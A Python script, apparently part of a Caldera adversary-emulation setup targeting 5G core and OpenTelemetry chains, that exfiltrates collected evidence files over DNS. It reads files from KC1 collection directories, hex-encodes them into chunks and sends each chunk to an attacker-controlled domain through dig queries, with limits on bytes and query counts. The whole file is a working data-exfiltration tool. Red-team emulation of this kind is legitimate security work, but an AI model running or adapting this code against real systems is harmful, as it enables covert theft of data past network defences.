#!/usr/bin/env python3
"""Exfiltrate collected KC1 evidence through DNS lookups.

The OpenTelemetry chain writes to ``KC1/udm-ex`` while the 5G core chain writes
to ``KC1/nfs-collection``.  This entrypoint accepts either layout and keeps DNS
queries bounded so a missing or unexpectedly large collection does not leave a
Caldera operation stuck.
"""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path


DEFAULT_MAX_BYTES = 2048
DEFAULT_MAX_FILES = 8
DEFAULT_MAX_QUERIES = 64
DEFAULT_CHUNK_SIZE = 30


def env_int(name: str, default: int) -> int:
    raw = os.getenv(name, str(default)).strip()
    try:
        return int(raw)
    except ValueError as exc:
        raise SystemExit(f"{name} must be an integer, got {raw!r}") from exc


def env_bool(name: str, default: bool = False) -> bool:
    raw = os.getenv(name)
    if raw is None or raw == "":
        return default
    return raw.lower() in {"1", "true", "yes", "on"}


def candidate_dirs(data_path: Path) -> list[Path]:
    explicit = os.getenv("UDM_EX_OUT_DIR", "").strip()
    candidates: list[Path] = []
    if explicit:
        candidates.append(Path(explicit))
    candidates.extend(
        [
            data_path / "KC1" / "udm-ex",
            data_path / "KC1" / "nfs-collection",
            data_path / "KC1",
        ]
    )
    deduped: list[Path] = []
    seen: set[Path] = set()
    for path in candidates:
        key = path.resolve() if path.exists() else path.absolute()
        if key not in seen:
            deduped.append(path)
            seen.add(key)
    return deduped


def select_source_dir(data_path: Path) -> Path | None:
    for path in candidate_dirs(data_path):
        if path.is_dir() and any(child.is_file() for child in path.rglob("*")):
            return path
    return None


def iter_files(root: Path, max_files: int) -> list[Path]:
    files = [path for path in sorted(root.rglob("*")) if path.is_file() and path.stat().st_size > 0]
    if max_files > 0:
        return files[:max_files]
    return files


def query_name(seq: int, chunk: bytes, domain: str) -> str:
    label = chunk.hex()
    return f"{seq:x}.{label}.{domain}"


def send_query(qname: str, timeout: int) -> bool:
    command = ["dig", "+short", f"+time={timeout}", "+tries=1", qname]
    completed = subprocess.run(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    return completed.returncode == 0


def main() -> int:
    data_path = Path(os.getenv("DATA_PATH", "/tmp/KCData"))
    source_dir = select_source_dir(data_path)
    if source_dir is None:
        print(f"No KC1 collection found under {data_path}; nothing to exfiltrate.")
        return 0

    domain = (
        os.getenv("ATTACKER_ADDR")
        or os.getenv("ATTACKERADDR")
        or os.getenv("EXFIL_DOMAIN")
        or "attacker"
    ).strip(".")
    if not domain:
        domain = "attacker"

    chunk_size = max(1, min(30, env_int("DNS_EXFIL_CHUNK_SIZE", DEFAULT_CHUNK_SIZE)))
    max_bytes = env_int("DNS_EXFIL_MAX_BYTES", DEFAULT_MAX_BYTES)
    max_files = env_int("DNS_EXFIL_MAX_FILES", DEFAULT_MAX_FILES)
    max_queries = env_int("DNS_EXFIL_MAX_QUERIES", DEFAULT_MAX_QUERIES)
    timeout = max(1, env_int("DNS_EXFIL_QUERY_TIMEOUT", 1))
    strict = env_bool("DNS_EXFIL_STRICT", False)

    files = iter_files(source_dir, max_files)
    sent_bytes = 0
    sent_queries = 0
    failed_queries = 0
    seq = 0

    for path in files:
        remaining_budget = None if max_bytes <= 0 else max_bytes - sent_bytes
        if remaining_budget is not None and remaining_budget <= 0:
            break

        data = path.read_bytes()
        if remaining_budget is not None:
            data = data[:remaining_budget]

        for offset in range(0, len(data), chunk_size):
            if max_queries > 0 and sent_queries >= max_queries:
                break
            chunk = data[offset : offset + chunk_size]
            seq += 1
            sent_queries += 1
            if not send_query(query_name(seq, chunk, domain), timeout):
                failed_queries += 1
        sent_bytes += len(data)

        if max_queries > 0 and sent_queries >= max_queries:
            break

    print(
        "DNS exfiltration completed: "
        f"source={source_dir} files={len(files)} bytes={sent_bytes} "
        f"queries={sent_queries} failures={failed_queries} domain={domain}"
    )

    if sent_queries == 0:
        print(f"No non-empty files found in {source_dir}; nothing to exfiltrate.")
        return 0
    if strict and failed_queries:
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
